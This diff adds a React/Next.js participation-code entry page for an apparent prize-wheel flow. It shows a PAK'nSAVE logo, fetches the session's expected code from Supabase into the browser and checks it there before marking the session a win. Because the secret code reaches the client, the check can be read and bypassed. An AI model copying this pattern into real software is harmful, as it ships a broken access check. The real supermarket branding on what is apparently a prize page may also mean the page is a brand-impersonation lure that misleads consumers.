@@ -1,0 +1,216 @@
+"use client";
+
+import { useEffect, useState } from "react";
+import { useRouter } from "next/navigation";
+import { createBrowserSupabaseClient } from "@/lib/supabase/client";
+import { ConfigMissing } from "@/components/demo/ConfigMissing";
+import { useSettings } from "@/contexts/SettingsContext";
+import {
+  getPreferredRouteSessionId,
+  persistActiveSession,
+} from "@/lib/session-id-client";
+
+export function CodeEntryClient({
+  sessionId,
+  routeSessionId,
+}: {
+  sessionId: string;
+  routeSessionId?: string;
+}) {
+  const router = useRouter();
+  const supabase = createBrowserSupabaseClient();
+  const { settings, loading: settingsLoading } = useSettings();
+  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
+  const [partnerName, setPartnerName] = useState<string>("");
+  const [expectedCode, setExpectedCode] = useState<string>("");
+  const [enteredCode, setEnteredCode] = useState("");
+  const [loading, setLoading] = useState(true);
+  const [error, setError] = useState<string | null>(null);
+  const [processing, setProcessing] = useState(false);
+
+  useEffect(() => {
+    let cancelled = false;
+    void (async () => {
+      if (supabase === null) {
+        setLoading(false);
+        return;
+      }
+      const { data, error: qErr } = await supabase
+        .from("sessions")
+        .select("partner_name, participation_code, form_data")
+        .eq("id", sessionId)
+        .maybeSingle();
+
+      if (cancelled) return;
+      if (qErr || !data) {
+        setError("Session not found or configuration is invalid.");
+        setLoading(false);
+        return;
+      }
+
+      const formData = data.form_data as Record<string, any>;
+      setPartnerName(formData?.partner_display_name || data.partner_name || "partner");
+      setExpectedCode(data.participation_code || "");
+      setLoading(false);
+    })();
+    return () => {
+      cancelled = true;
+    };
+  }, [sessionId, supabase]);
+
+  async function handleSubmit(e: React.FormEvent) {
+    e.preventDefault();
+    if (!supabase) return;
+    setError(null);
+
+    const cleanCode = enteredCode.trim().toLowerCase();
+    const expectedCodeClean = expectedCode.trim().toLowerCase();
+    if (!cleanCode) {
+      setError("Enter your participation code.");
+      return;
+    }
+
+    if (expectedCodeClean && cleanCode !== expectedCodeClean) {
+      setError("The code you entered is invalid.");
+      return;
+    }
+
+    setProcessing(true);
+
+    const { error: upErr } = await supabase
+      .from("sessions")
+      .update({ is_hidden: false, current_step: "win" })
+      .eq("id", sessionId);
+
+    if (upErr) {
+      setError("Saving failed. Please try again.");
+      setProcessing(false);
+      return;
+    }
+
+    persistActiveSession(sessionId, effectiveRouteSessionId);
+
+    window.setTimeout(() => {
+      setProcessing(false);
+      router.push(`/win/${encodeURIComponent(effectiveRouteSessionId)}`);
+    }, 500);
+  }
+
+
+  if (settingsLoading) {
+    return (
+      <div className="flex min-h-[100dvh] items-center justify-center">
+        <div className="flex justify-center py-16">
+          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
+        </div>
+      </div>
+    );
+  }
+
+  if (!supabase) {
+    return (
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
+          <ConfigMissing />
+        </div>
+      </div>
+    );
+  }
+
+  if (loading) {
+    return (
+      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
+          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in">
+        
+        {/* Right Top Logo Placeholder */}
+        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
+          <img
+            src="/wheel-assets/desktop/png/paknsave-logo-hub.png"
+            alt="PAK'nSAVE logo"
+            className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
+            id="code-brand-logo"
+          />
+        </div>
+
+        <div className="mb-6 flex items-start gap-4">
+          <div className="mt-1 shrink-0">
+            <div
+              id="code-gift-icon"
+              className="flex h-12 w-12 items-center justify-center rounded-2xl bg-white/10 text-[#ffd34d]"
+              aria-hidden="true"
+            >
+              <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" />
+              </svg>
+            </div>
+          </div>
+          <div>
+            <h2 className="text-2xl font-bold text-white mb-1">{settings.code_title}</h2>
+            <p className="text-sm text-gray-300 font-medium whitespace-pre-line">
+              {settings.code_subtitle.split("{partner}").map((part, i, arr) => (
+                <span key={i}>
+                  {part}
+                  {i < arr.length - 1 && <strong className="text-[#0088FF] font-bold">{partnerName}</strong>}
+                </span>
+              ))}
+            </p>
+          </div>
+        </div>
+
+        {error && (
+          <div className="mb-6 rounded-xl bg-red-500/10 p-4 text-center text-sm font-bold text-red-400 border border-red-500/20">
+            {error}
+          </div>
+        )}
+
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <div>
+            <label className="mb-2 block text-sm font-medium text-white text-left">Participation Code</label>
+            <div className="relative">
+              <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-4">
+                <svg className="h-6 w-6 opacity-70 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M16 5H8a3 3 0 00-3 3v1a2 2 0 010 4v1a3 3 0 003 3h8a3 3 0 003-3v-1a2 2 0 010-4V8a3 3 0 00-3-3z" />
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 8v8" />
+                </svg>
+              </div>
+              <input
+                type="text"
+                required
+                className="w-full rounded-xl border border-transparent bg-white/10 py-4 pl-12 pr-4 text-2xl font-bold tracking-widest text-white outline-none focus:border-[#0066CC] focus:ring-2 focus:ring-[#0066CC]/50 transition-all placeholder:text-gray-500 shadow-sm"
+                value={enteredCode}
+                onChange={(e) => setEnteredCode(e.target.value)}
+                placeholder=""
+                autoComplete="off"
+              />
+            </div>
+          </div>
+          <button
+            type="submit"
+            disabled={processing}
+            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+          >
+            {processing ? settings.sms_loading : settings.code_button}
+          </button>
+          
+          <div className="mt-4 flex items-center justify-center gap-2">
+            <svg className="h-5 w-5 text-[#00d26a]" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+            </svg>
+            <span className="text-[13px] font-medium text-gray-300">
+              Your information is processed securely.
+            </span>
+          </div>
+        </form>
+      </div>
+    </div>
+  );
+}
